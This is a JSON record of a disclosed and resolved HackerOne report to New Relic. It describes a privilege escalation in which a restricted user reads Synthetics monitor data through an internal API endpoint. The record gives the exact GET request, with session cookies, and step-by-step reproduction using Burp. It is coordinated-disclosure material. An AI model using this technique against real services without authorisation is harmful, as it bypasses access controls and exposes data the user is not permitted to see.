@@ -1,0 +1,136 @@
+{
+  "id": 320200,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjAyMDA=",
+  "url": "https://hackerone.com/reports/320200",
+  "title": "[NR Alerts/Synthetics?] User with no Synthetics permissions can view synthetic monitor details through /internal_api/ endpoint",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-27T07:40:07.227Z",
+  "submitted_at": "2018-02-27T07:40:07.227Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jon_bottarini",
+    "url": "/jon_bottarini",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-04T10:59:21.042Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:43:51.214Z",
+  "team_member_agreed_on_going_public_at": "2020-09-04T10:59:20.964Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey all, \n\nThis one is pretty interesting. What's happening is that a user with no permissions to view synthetics will get this page when they try to navigate directly to the Synthetics monitor list (https://synthetics.newrelic.com/accounts/1523936/monitors): \n\n{F267305}\n\nHowever, the restricted user can bypass this completely by sending this GET request to the internal API at this endpoint `/internal_api/1/accounts/1523936/conditions/load_synthetics_monitors`:\n\n\n```\nGET /internal_api/1/accounts/1523936/conditions/load_synthetics_monitors HTTP/1.1\nHost: alerts.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://alerts.newrelic.com/welcome?account_id=1523936\nx-xsrf-token: +ssaPGFnXG2o99S0CDVqyIvB23POTg//Xrxw5CHsEZiBX/uSxXQ+sgnBzM0li/s+tDIq+UBRobNOLkeRBa/ywg==\norigin: https://alerts.newrelic.com\nCookie: TSNGUID=4d0c728d-ca39-4249-b618-3e03cdb2e263; ajs_user_id=2002496; ajs_group_id=1523936; ajs_anonymous_id=%221d5c30ea-a4a3-4e4c-bf81-2360e470b0a8%22; login_service_login_newrelic_com_tokens=%7B%22token%22%3A+%22CbBos73LBwhxn4oKTqky%2BqnR20SgMUHkBB7zv4ikNTtp8z4egWJCrA34AZS27i6de6TBu%2BRE2XRQyyEX1v7OlVAHolNpW7IgVXMyE9p%2FEFnLQli6F2hUeAW4JEK%2F7VoSrO7xqDz7sGG%2FtTu66eUVBAsSuY7cGRGbLCDdoakp9Z85c1ap5sqbJCbkEGDJfLQbEGLlxpiWiWI8Fn2mpzItEyVzOTkf20kGydhHQx%2FJGmN57zM3xY3K8sa31iWw6kU5rx%2F7MpjGGXUAGy1Tf3oHZCLS3uHn6UbHJ5gtO1lda5S4DKQ%2FZc0cpctAly6iqwA6%2F955J4Du4%2BDtH4yOI9lyFw%3D%3D%22%2C+%22refresh_token%22%3A+%22MBdDzazAT2KO3l6p0ilKDFWuGTAnU23sk5gf%2B10%2FTMy6PpogRw1%2BtQCR%2BemWyd9wUMVG6qAcDXHF41WSvrZOlsQftkEmP%2Fy7j4auTwUBJZw6DMJaFdJvXLhUJzljeOPLesRLuLU%2FdQ29xsGrhngrbakrJaNpgyJaFAdnaaNHxH5E%2F09Jr7t%2Bns5xCiDXSqrWBTQ48BvDlQD7LeuKry0riaUqA8gO95NtPSWLFq%2FdDEvAKv%2FicK%2FoiJXH%2B%2Bf%2FK%2F7CRMn1EGvLEUiO6JXdc9KyeqrjlEZsKOXZ7XjmaFGAW%2BZ%2FR0YvDd92O2h%2Fdq5YBXT8qT%2B0Jm95LkLzA%2FXZVNMBCw%3D%3D%22%7D; nr_zd_logged_in=true; optimizelyEndUserId=oeu1519709122916r0.9563735230431125; XSRF-TOKEN=%2BssaPGFnXG2o99S0CDVqyIvB23POTg%2F%2FXrxw5CHsEZiBX%2FuSxXQ%2BsgnBzM0li%2Fs%2BtDIq%2BUBRobNOLkeRBa%2Fywg%3D%3D; _alerting_service_ui_production_session=ZnBIWVgzUlc4d3lZYWVDSFJ3bVJqNU5RUzVrYUNwaXIwVHlOTUhDRHMrZmpjZld3N0hCOWExY3pzNjZjSEpUL3liSjNISkJIWDVKSVVMbit4b2FOR2MrY2FhcWdGeXdRVm1YMzgxcmd2WUNmYVdCZXlMM01YVDlZY0lUTDh2ZkdldWY3eldzVm9rUjlESXZnSktOVmp1ZnpWeHkwaDdudUE3SnNOOWZRekd4a0xBWU5EeHgraTd1MzZhMXNDeUx2LS1SMFpReGZoK3RGUVgyenY2RmVPa0lnPT0%3D--927238510497a0f9c1550af542246bd70852d3af; login_idle_session_timeout={\"lastInteractionAt\":1519714498,\"warningTime\":180,\"lastIdleLimitCheck\":1519714454,\"idleLimit\":1577880000}\nDNT: 1\nConnection: close\n```\n\nAnd the response will be... all the monitors and all their data (interestingly, it actually contains a bunch more data than is usually provided within Synthetics, like the API version, AWS/Linode locations, which is pretty useless to an attacker but interesting nonetheless): \n\n{F267307}\n\n#Steps to reproduce\n\n1. Login to NR as a restricted user\n2. Reload a page and intercept the request, send it to repeater in Burp so that it has your user cookies and everything\n2. Replace the request in repeater by sending a GET request to `/internal_api/1/accounts/1523936/conditions/load_synthetics_monitors` \n3. Response will contain all the monitors that you don't have permission to view \n\nLet me know if this is unclear or needs additional info, thanks! \n\nJon Bottarini\n\n## Impact\n\nStandard run of the mill privilege escalation, allows under privileged user to view things they shouldn't see",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 267305,
+      "file_name": "Restricted_View.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/267/305/8ccc2ffb0049a4afdbfbf77f1680ea9a78109b71/Restricted_View.png?response-content-disposition=attachment%3B%20filename%3D%22Restricted_View.png%22%3B%20filename%2A%3DUTF-8%27%27Restricted_View.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efc670608f5bf449cacd4ee5a3061df37c98189b83a724673d6efd065ec0d864",
+      "file_size": 355112,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 267307,
+      "file_name": "Screen_Shot_2018-02-26_at_11.00.50_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/267/307/79305577b3596170dc30f1e87d7cdd27c8384794/Screen_Shot_2018-02-26_at_11.00.50_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-02-26_at_11.00.50_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-02-26_at_11.00.50_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6030b4c16d3d5d6e6aeb44add210036a7db121bd3d8c472597b0da616a76291c",
+      "file_size": 456297,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-19T02:43:51.267Z",
+  "allow_singular_disclosure_after": -107345742.60698932,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "wi11",
+    "ali",
+    "f1ras",
+    "prateek_thakare",
+    "cryptographer",
+    "h1-qualys-scan",
+    "virtz"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 6454,
+    "asset_type": "URL",
+    "asset_identifier": "alerts.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
